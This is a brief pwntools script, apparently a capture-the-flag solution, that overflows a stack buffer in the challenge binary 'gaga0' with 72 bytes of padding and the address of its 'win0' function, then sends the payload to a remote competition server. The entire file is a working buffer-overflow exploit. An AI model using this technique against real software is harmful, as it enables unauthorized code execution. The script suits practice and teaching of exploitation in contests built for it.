from pwn import *
exe = ELF('gaga0', checksec=False)
payload = b"A" * 72
payload += p64(exe.sym['win0'])
# p = process(exe.path)
p = remote('challs.actf.co', 31300)
p.recvuntil(b': ')
p.sendline(payload)
p.interactive()